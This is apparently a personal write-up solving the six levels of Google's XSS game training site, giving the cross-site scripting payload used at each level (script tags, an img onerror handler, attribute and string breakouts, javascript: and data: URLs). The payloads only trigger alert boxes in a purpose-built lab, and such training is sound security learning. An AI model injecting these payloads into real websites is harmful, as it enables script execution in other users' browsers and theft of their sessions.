# Google XSS game

**[URL](https://xss-game.appspot.com/)**

## Level 1

the query can be `<script>alert()</script>` i.e. the URL can be `https://xss-game.appspot.com/level1/frame?query=<script>alert()</script>`

![level 1](/assets/gxss/level1.png)

## Level 2

the text that we enter does not seem to render a script, so maybe there's an evasion against this

so, we can try another type of xss attack - through `img` tag's `onerror` attribute

payload - `<img src=x onerror=alert()>`

![level 2](/assets/gxss/level2.png)

## Level 3

the source of `/level3/frame/` gives us this:

```js
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

so, we can manipulate the URL to go to `https://xss-game.appspot.com/level3/frame#' onerror=alert() src='`

![level 3](/assets/gxss/level3.png)

## Level 4

since there is a timeout here, the function used can be this

```js
setTimeout(function(){ alert("Time is up!"); }, 3000);
```

this means, for it to receive user input, it must be like this

```js
setTimeout(function(){ alert("Time is up!"); }, userInput);
```

or

```js
setTimeout(function(){ alert("Time is up!"); }, `${userInput}`);
```

so, we can try this in the text box - `0); alert(1` - but this does not work

so, we try the same with strings - `0'); alert('1` - and it works

![level 4](/assets/gxss/level4.png)

## Level 5

the query string `?next=confirm` was a bit suspicious and looked exploitable

the value of next turned out to be relative link to the next page that we'll go to after pressing `next` in the page

so, there might be a possibility to inject javascript as a link i.e. as `javascript:alert()`

so, i changed to URL to be `https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()` and it worked

![level 5](/assets/gxss/level5.png)

## Level 6

got stuck in this level, so other solutions told me about using data urls like this `data:text/javascript,alert(1)`

![level 6](/assets/gxss/level6.png)

ref

* [data urls](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs)
* [google xss docs](https://www.google.com/about/appsecurity/learning/xss/index.html)
